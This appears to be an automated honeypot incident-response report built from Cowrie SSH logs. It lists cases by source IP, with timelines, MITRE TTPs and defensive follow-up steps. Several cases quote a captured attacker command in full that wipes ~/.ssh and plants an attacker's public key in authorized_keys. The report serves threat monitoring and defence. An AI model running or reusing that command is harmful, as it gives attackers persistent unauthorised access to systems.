| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:27:31` | `cowrie.session.connect` |
| `2026-10-22 01:27:31` | `cowrie.client.version` |
| `2026-10-22 01:27:31` | `cowrie.client.kex` |
| `2026-10-22 01:27:32` | `cowrie.login.success` |
| `2026-10-22 01:27:33` | `cowrie.session.params` |
| `2026-10-22 01:27:33` | `cowrie.command.input` |
| `2026-10-22 01:27:33` | `cowrie.command.failed` |
| `2026-10-22 01:27:33` | `cowrie.log.closed` |
| `2026-10-22 01:27:33` | `cowrie.session.params` |
| `2026-10-22 01:27:33` | `cowrie.command.input` |
| `2026-10-22 01:27:33` | `cowrie.session.file_download` |
| `2026-10-22 01:27:33` | `cowrie.log.closed` |
| `2026-10-22 01:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.235[.]214` to AbuseIPDB if not already reported
- [ ] Block `134.209.235[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cad01525a0a

| Field | Detail |
|---|---|
| **Source IP** | `134.209.235[.]214` |
| **First Seen** | 2026-10-22 01:27 |
| **Last Seen** | 2026-10-22 01:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:27:33` | `cowrie.session.connect` |
| `2026-10-22 01:27:33` | `cowrie.client.version` |
| `2026-10-22 01:27:34` | `cowrie.client.kex` |
| `2026-10-22 01:27:34` | `cowrie.login.success` |
| `2026-10-22 01:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.235[.]214` to AbuseIPDB if not already reported
- [ ] Block `134.209.235[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95cd76d26bd

| Field | Detail |
|---|---|
| **Source IP** | `191.37.76[.]156` |
| **First Seen** | 2026-10-22 01:29 |
| **Last Seen** | 2026-10-22 01:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:29:19` | `cowrie.session.connect` |
| `2026-10-22 01:29:19` | `cowrie.client.version` |
| `2026-10-22 01:29:19` | `cowrie.client.kex` |
| `2026-10-22 01:29:20` | `cowrie.login.success` |
| `2026-10-22 01:29:20` | `cowrie.session.params` |
| `2026-10-22 01:29:20` | `cowrie.command.input` |
| `2026-10-22 01:29:20` | `cowrie.command.failed` |
| `2026-10-22 01:29:21` | `cowrie.log.closed` |
| `2026-10-22 01:29:21` | `cowrie.session.params` |
| `2026-10-22 01:29:21` | `cowrie.command.input` |
| `2026-10-22 01:29:22` | `cowrie.session.file_download` |
| `2026-10-22 01:29:22` | `cowrie.log.closed` |
| `2026-10-22 01:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.37.76[.]156` to AbuseIPDB if not already reported
- [ ] Block `191.37.76[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4563dfadb7

| Field | Detail |
|---|---|
| **Source IP** | `191.37.76[.]156` |
| **First Seen** | 2026-10-22 01:29 |
| **Last Seen** | 2026-10-22 01:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:29:22` | `cowrie.session.connect` |
| `2026-10-22 01:29:22` | `cowrie.client.version` |
| `2026-10-22 01:29:22` | `cowrie.client.kex` |
| `2026-10-22 01:29:22` | `cowrie.login.success` |
| `2026-10-22 01:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.37.76[.]156` to AbuseIPDB if not already reported
- [ ] Block `191.37.76[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb1aca472b35

| Field | Detail |
|---|---|
| **Source IP** | `92.27.101[.]99` |
| **First Seen** | 2026-10-22 01:30 |
| **Last Seen** | 2026-10-22 01:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:30:12` | `cowrie.session.connect` |
| `2026-10-22 01:30:12` | `cowrie.client.version` |
| `2026-10-22 01:30:12` | `cowrie.client.kex` |
| `2026-10-22 01:30:13` | `cowrie.login.success` |
| `2026-10-22 01:30:14` | `cowrie.session.params` |
| `2026-10-22 01:30:14` | `cowrie.command.input` |
| `2026-10-22 01:30:14` | `cowrie.command.failed` |
| `2026-10-22 01:30:14` | `cowrie.log.closed` |
| `2026-10-22 01:30:14` | `cowrie.session.params` |
| `2026-10-22 01:30:14` | `cowrie.command.input` |
| `2026-10-22 01:30:14` | `cowrie.session.file_download` |
| `2026-10-22 01:30:14` | `cowrie.log.closed` |
| `2026-10-22 01:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.27.101[.]99` to AbuseIPDB if not already reported
- [ ] Block `92.27.101[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077dc2672a21

| Field | Detail |
|---|---|
| **Source IP** | `92.27.101[.]99` |
| **First Seen** | 2026-10-22 01:30 |
| **Last Seen** | 2026-10-22 01:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:30:15` | `cowrie.session.connect` |
| `2026-10-22 01:30:15` | `cowrie.client.version` |
| `2026-10-22 01:30:15` | `cowrie.client.kex` |
| `2026-10-22 01:30:15` | `cowrie.login.success` |
| `2026-10-22 01:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.27.101[.]99` to AbuseIPDB if not already reported
- [ ] Block `92.27.101[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-623e6a93237a

| Field | Detail |
|---|---|
| **Source IP** | `92.30.243[.]69` |
| **First Seen** | 2026-10-22 01:30 |
| **Last Seen** | 2026-10-22 01:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:30:32` | `cowrie.session.connect` |
| `2026-10-22 01:30:32` | `cowrie.client.version` |
| `2026-10-22 01:30:32` | `cowrie.client.kex` |
| `2026-10-22 01:30:32` | `cowrie.login.success` |
| `2026-10-22 01:30:33` | `cowrie.session.params` |
| `2026-10-22 01:30:33` | `cowrie.command.input` |
| `2026-10-22 01:30:33` | `cowrie.command.failed` |
| `2026-10-22 01:30:33` | `cowrie.log.closed` |
| `2026-10-22 01:30:34` | `cowrie.session.params` |
| `2026-10-22 01:30:34` | `cowrie.command.input` |
| `2026-10-22 01:30:34` | `cowrie.session.file_download` |
| `2026-10-22 01:30:34` | `cowrie.log.closed` |
| `2026-10-22 01:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.243[.]69` to AbuseIPDB if not already reported
- [ ] Block `92.30.243[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4db2c258ee

| Field | Detail |
|---|---|
| **Source IP** | `92.30.243[.]69` |
| **First Seen** | 2026-10-22 01:30 |
| **Last Seen** | 2026-10-22 01:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:30:34` | `cowrie.session.connect` |
| `2026-10-22 01:30:34` | `cowrie.client.version` |
| `2026-10-22 01:30:34` | `cowrie.client.kex` |
| `2026-10-22 01:30:35` | `cowrie.login.success` |
| `2026-10-22 01:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.243[.]69` to AbuseIPDB if not already reported
- [ ] Block `92.30.243[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a73f1e2327c

| Field | Detail |
|---|---|
| **Source IP** | `116.255.227[.]108` |
| **First Seen** | 2026-10-22 01:46 |
| **Last Seen** | 2026-10-22 01:51 |
| **Session Duration** | 269s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:46:36` | `cowrie.session.connect` |
| `2026-10-22 01:46:36` | `cowrie.client.version` |
| `2026-10-22 01:46:37` | `cowrie.client.kex` |
| `2026-10-22 01:46:38` | `cowrie.login.success` |
| `2026-10-22 01:46:39` | `cowrie.session.params` |
| `2026-10-22 01:46:39` | `cowrie.command.input` |
| `2026-10-22 01:46:39` | `cowrie.command.failed` |
| `2026-10-22 01:46:40` | `cowrie.log.closed` |
| `2026-10-22 01:46:40` | `cowrie.session.params` |
| `2026-10-22 01:46:40` | `cowrie.command.input` |
| `2026-10-22 01:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.255.227[.]108` to AbuseIPDB if not already reported
- [ ] Block `116.255.227[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4977da35b8f6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-22 01:49 |
| **Last Seen** | 2026-10-22 01:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 01:49:34` | `cowrie.session.connect` |
| `2026-10-22 01:49:34` | `cowrie.client.version` |
| `2026-10-22 01:49:34` | `cowrie.client.kex` |
| `2026-10-22 01:49:35` | `cowrie.login.success` |
| `2026-10-22 01:49:35` | `cowrie.direct-tcpip.request` |
| `2026-10-22 01:49:35` | `cowrie.direct-tcpip.data` |
| `2026-10-22 01:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f0a4dcc702

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-10-22 02:01 |
| **Last Seen** | 2026-10-22 02:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 02:01:18` | `cowrie.session.connect` |
| `2026-10-22 02:01:18` | `cowrie.client.version` |
| `2026-10-22 02:01:18` | `cowrie.client.kex` |
| `2026-10-22 02:01:19` | `cowrie.login.success` |
| `2026-10-22 02:01:20` | `cowrie.session.params` |
| `2026-10-22 02:01:20` | `cowrie.command.input` |
| `2026-10-22 02:01:20` | `cowrie.log.closed` |
| `2026-10-22 02:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fcf6b9fd03

| Field | Detail |
|---|---|
| **Source IP** | `218.60.77[.]234` |
| **First Seen** | 2026-10-22 02:16 |
| **Last Seen** | 2026-10-22 02:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 02:16:51` | `cowrie.session.connect` |
| `2026-10-22 02:16:51` | `cowrie.client.version` |
| `2026-10-22 02:16:52` | `cowrie.client.kex` |
| `2026-10-22 02:16:56` | `cowrie.login.success` |
| `2026-10-22 02:17:00` | `cowrie.session.params` |
| `2026-10-22 02:17:00` | `cowrie.command.input` |
| `2026-10-22 02:17:01` | `cowrie.log.closed` |
| `2026-10-22 02:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.60.77[.]234` to AbuseIPDB if not already reported
- [ ] Block `218.60.77[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e8e569739a

| Field | Detail |
|---|---|
| **Source IP** | `218.27.202[.]178` |
| **First Seen** | 2026-10-22 02:27 |
| **Last Seen** | 2026-10-22 02:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-22 02:27:24` | `cowrie.session.connect` |
| `2026-10-22 02:27:25` | `cowrie.client.version` |
| `2026-10-22 02:27:25` | `cowrie.client.kex` |
| `2026-10-22 02:27:28` | `cowrie.login.success` |
| `2026-10-22 02:27:30` | `cowrie.session.params` |
| `2026-10-22 02:27:30` | `cowrie.command.input` |
| `2026-10-22 02:27:30` | `cowrie.log.closed` |
| `2026-10-22 02:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.27.202[.]178` to AbuseIPDB if not already reported
- [ ] Block `218.27.202[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (157) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e40e267bab3b | HIGH | `78.135.111[.]47` | 2026-10-22 02:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-36fcc52054ce | HIGH | `78.135.111[.]47` | 2026-10-22 02:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-372044307c86 | HIGH | `36.137.249[.]148` | 2026-10-22 02:40 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ea0283bd18b3 | HIGH | `203.113.105[.]99` | 2026-10-22 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-461afaf2c67a | HIGH | `203.113.105[.]99` | 2026-10-22 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7d8afb0612fd | HIGH | `62.193.91[.]121` | 2026-10-22 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-619a731b7e1c | HIGH | `62.193.91[.]121` | 2026-10-22 02:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47b2e1abad31 | HIGH | `80.94.95[.]118` | 2026-10-22 03:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e916ded31f6 | HIGH | `176.53.159[.]196` | 2026-10-22 03:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3db3ecc305aa | HIGH | `35.195.24[.]58` | 2026-10-22 03:51 | Y | 2 | 0 | `T1078` |
| IR-5062d1c07965 | HIGH | `35.195.24[.]58` | 2026-10-22 03:51 | Y | 1 | 0 | `T1078` |
| IR-7379110fdc59 | HIGH | `35.195.24[.]58` | 2026-10-22 03:51 | Y | 0 | 0 | `T1078` |
| IR-226b8cda8b71 | HIGH | `154.206.89[.]53` | 2026-10-22 03:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e6750fecb366 | HIGH | `154.206.89[.]53` | 2026-10-22 03:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7664328364c6 | HIGH | `59.15.58[.]148` | 2026-10-22 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-094f0028eb2a | HIGH | `59.15.58[.]148` | 2026-10-22 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-998ac275c6c9 | HIGH | `103.177.111[.]164` | 2026-10-22 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d5445627ec8c | HIGH | `103.177.111[.]164` | 2026-10-22 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2724101e33c8 | HIGH | `124.174.22[.]26` | 2026-10-22 04:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e627b9ae75e2 | HIGH | `124.174.22[.]26` | 2026-10-22 04:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4cf0a29ba4b5 | HIGH | `80.94.95[.]118` | 2026-10-22 04:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3a88687b3135 | HIGH | `34.79.51[.]154` | 2026-10-22 04:16 | Y | 2 | 0 | `T1078` |
| IR-6cdcc67d8adb | HIGH | `34.79.51[.]154` | 2026-10-22 04:16 | Y | 1 | 0 | `T1078` |
| IR-9a21cda1e4e0 | HIGH | `34.79.51[.]154` | 2026-10-22 04:16 | Y | 0 | 0 | `T1078` |
| IR-814a954aff81 | HIGH | `179.43.153[.]2` | 2026-10-22 04:23 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0532bf8adaf8 | HIGH | `118.194.251[.]197` | 2026-10-22 04:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-06c54f670940 | HIGH | `118.194.251[.]197` | 2026-10-22 04:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b9f05a18414c | HIGH | `74.82.47[.]5` | 2026-10-22 04:51 | Y | 3 | 0 | `T1078` |
| IR-fefce17f89ed | HIGH | `180.76.103[.]111` | 2026-10-22 04:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c6769aa38589 | HIGH | `176.53.159[.]196` | 2026-10-22 04:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a1f9ebec702f | HIGH | `107.150.105[.]10` | 2026-10-22 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db1a2b6dc918 | HIGH | `107.150.105[.]10` | 2026-10-22 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6076f9416dd9 | HIGH | `43.128.3[.]201` | 2026-10-22 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-71b2563fef6a | HIGH | `43.128.3[.]201` | 2026-10-22 04:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e7758ce905a0 | HIGH | `104.199.79[.]62` | 2026-10-22 04:58 | Y | 2 | 0 | `T1078` |
| IR-2661f470fe2e | HIGH | `104.199.79[.]62` | 2026-10-22 04:58 | Y | 1 | 0 | `T1078` |
| IR-8ded73aad524 | HIGH | `104.199.79[.]62` | 2026-10-22 04:58 | Y | 0 | 0 | `T1078` |
| IR-cebae9dca7d0 | HIGH | `38.22.170[.]10` | 2026-10-22 04:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a78aebdf01cc | HIGH | `38.22.170[.]10` | 2026-10-22 04:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db3a97f9cb9f | HIGH | `103.241.43[.]193` | 2026-10-22 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-02f9831571a3 | HIGH | `103.241.43[.]193` | 2026-10-22 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c81f63fe1aaa | HIGH | `193.112.192[.]91` | 2026-10-22 05:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3c89f1e404f7 | HIGH | `196.189.236[.]67` | 2026-10-22 05:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6d373d5cb60 | HIGH | `130.12.180[.]51` | 2026-10-22 05:17 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-739277f8ac45 | HIGH | `220.118.173[.]234` | 2026-10-22 05:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cc346827032d | HIGH | `220.118.173[.]234` | 2026-10-22 05:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-111b5bfddc58 | HIGH | `187.110.238[.]50` | 2026-10-22 05:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0b9600c16348 | HIGH | `187.110.238[.]50` | 2026-10-22 05:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c339b9aa2d8f | HIGH | `179.43.153[.]2` | 2026-10-22 06:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2197abbb5ba4 | HIGH | `34.78.18[.]81` | 2026-10-22 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-670f014bb620 | HIGH | `211.106.133[.]202` | 2026-10-22 06:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c4b07eee9902 | HIGH | `211.106.133[.]202` | 2026-10-22 06:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a66440185197 | HIGH | `101.79.165[.]43` | 2026-10-22 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f28be2150099 | HIGH | `101.79.165[.]43` | 2026-10-22 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6a922090ca24 | HIGH | `114.130.85[.]36` | 2026-10-22 06:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db7cd557e92c | HIGH | `114.130.85[.]36` | 2026-10-22 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ff415e10c0ce | HIGH | `65.181.71[.]117` | 2026-10-22 06:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7f14bc713b8a | HIGH | `65.181.71[.]117` | 2026-10-22 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-83db5cae7ee8 | HIGH | `186.209.77[.]237` | 2026-10-22 06:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-817d79cadd2d | HIGH | `186.209.77[.]237` | 2026-10-22 06:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55dd489d9eb5 | HIGH | `130.12.180[.]51` | 2026-10-22 06:49 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-6b5d3b9b46c3 | HIGH | `176.53.159[.]196` | 2026-10-22 06:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79ce72cabc3a | HIGH | `169.58.33[.]158` | 2026-10-22 07:35 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a0b523985d6b | HIGH | `77.90.185[.]17` | 2026-10-22 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c12d3a02f928 | HIGH | `188.152.238[.]126` | 2026-10-22 07:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bc4fca32d01b | HIGH | `188.152.238[.]126` | 2026-10-22 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0fd2809d6655 | HIGH | `112.151.168[.]124` | 2026-10-22 07:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
